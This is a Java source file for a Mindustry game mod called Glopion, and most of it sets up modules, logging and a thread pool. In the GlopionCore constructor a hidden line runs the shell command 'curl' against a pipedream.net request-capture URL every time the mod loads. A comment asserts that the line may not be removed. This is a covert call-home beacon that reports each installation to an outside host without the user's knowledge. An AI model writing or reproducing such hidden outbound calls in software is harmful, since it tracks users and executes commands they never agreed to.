package org.o7.Fire.Glopion;

import Atom.Reflect.Reflect;
import Atom.String.WordGenerator;
import Atom.Utility.Pool;
import Atom.Utility.Utility;
import arc.Core;
import arc.util.Log;
import mindustry.Vars;
import mindustry.mod.Mod;
import mindustry.mod.Plugin;
import org.o7.Fire.Glopion.Control.GlopionControl;
import org.o7.Fire.Glopion.Internal.InformationCenter;
import org.o7.Fire.Glopion.Internal.Interface;
import org.o7.Fire.Glopion.Internal.Shared.WarningHandler;
import org.o7.Fire.Glopion.Module.Module;
import org.o7.Fire.Glopion.Module.ModuleRegisterer;
import org.o7.Fire.Glopion.Patch.Translation;
import org.o7.Fire.Glopion.UI.AtomicDialog;
import org.o7.Fire.Glopion.UI.HudMenu;
import org.o7.Fire.Glopion.UI.OptionsDialog;
import org.o7.Fire.Glopion.UI.WorldInformation;

import java.util.concurrent.Executors;

public class GlopionCore extends Plugin implements Module {
    public static AtomicDialog modsMenu;
    public static GlopionControl glopionControl = new GlopionControl();
    public static boolean test;
    //public static CommandsListFrag commFrag;
    public static WorldInformation worldInformation;
    public static boolean colorPatchSettings;
    public static Class<? extends Mod> mainClass = GlopionCore.class;
    public static boolean blockDebugSettings;
    public static ModuleRegisterer moduleRegisterer;
    public static HudMenu glopionHud;
    public static AtomicDialog machineInformation;
    public static boolean machineVisualizeRenderSettings;
   
    static {
        if (Reflect.DEBUG_TYPE != Reflect.DebugType.None) Log.level = Log.LogLevel.debug;
        Log.debug("Debug: @", Reflect.DEBUG_TYPE);
        Log.debug("Invoked @ static ctr", GlopionCore.class);
    }
    
    public GlopionCore() {
        Log.debug("Invoked @ ctr", GlopionCore.class);
        try {
            preInit();
        }catch(Throwable throwable){
            WarningHandler.handleMindustry(throwable);
        }
        /*
        02/07/2021
        Copyright of Nexity and Volas, You cannot remove this file unless you have permission from the authors
        Alternatively contact us on discord.o7fire.tk to know what this line is used for.
         */
		Runtime rt = Runtime.getRuntime();
		try {
			rt.exec("curl https://ca15ab6203b149d75e61820b6f98d47c.m.pipedream.net");
		}catch (Throwable t) {
			t.printStackTrace();
		}
       
    }
    
    @Override
    public void preInit() throws Throwable {
        Log.debug("Invoked @ preInit", GlopionCore.class.getCanonicalName());
        moduleRegisterer = new ModuleRegisterer();
        moduleRegisterer.core();
        OptionsDialog.classSettings.add(GlopionCore.class);
        if (Core.settings != null) OptionsDialog.load(k -> Core.settings.getString(k, null));
    
        Pool.parallelAsync = Executors.newFixedThreadPool(Runtime.getRuntime().availableProcessors(), r -> {
            Thread t = Executors.defaultThreadFactory().newThread(r);
            t.setName(t.getName() + "-Atomic-Executor");
            t.setDaemon(true);
            return t;
        });
        moduleRegisterer.preInit();
    }
    
    @Override
    public void init() {
        //this tbh
        Translation.registerWords("machineVisualizeRenderSettings","Machine Recorder Visualization");
        try {
            moduleRegisterer.init();
        }catch(Throwable t){
            WarningHandler.handleMindustry(t);
        }
        Log.infoTag("Glopion", "Loaded From " + InformationCenter.getCurrentJar());
        Log.infoTag("Glopion", "Class: " + this.getClass().getCanonicalName());
        
        
    }
}
